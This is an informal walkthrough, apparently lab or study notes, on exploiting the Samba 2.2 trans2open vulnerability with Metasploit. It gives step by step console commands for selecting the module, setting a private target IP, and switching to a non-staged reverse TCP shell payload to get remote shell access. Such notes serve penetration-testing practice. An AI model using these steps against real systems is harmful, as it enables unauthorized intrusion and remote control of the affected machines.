So, after doing some reconaissanse, suppose we come across the name "trans2open" as an exploit for samba 2.2, and we wanna exploit this.


Let's do it with Metasploit 

> msfconsole

first we search for it

> search trans2open

we get something like:

exploit/freebsd/samba/trans2open
exploit/linux/samba/trans2open
exploit/osx/samba/trans2open
exploit/solaris/samba/trans2open

our research concluded the machine used linux, so we type

> use exploit/linux/samba/trans2open

now let's check the options with

> options

the output shows it requires an RHOST, so we feed it in:

> set rhost 192.168.57.134

we can see the targets by typing:

> show targets

and now we wanna run the exploit, so we can either type:

> exploit           // or //      > run

if it starts opening and closing shells like crazy, hit CTRL + C to stop it.
If we now check the options ( > options ) we can see the payload (in this case, linux/x86/meterpreter/reverse_tcp). 

Maybe the payload doesnt work, so we can check out other alternatives by typing 

> set payload linux/x86/                 AND DOUBLE-TAPPING TAB

Likely, we'd want a non-staged payload, and we see linux/x86/shell_reverse_tcp, so we swap to it:

> set payload linux/x86/shell_reverse_tcp

now we should run "run" or "exploit" and prop up a shell. 


















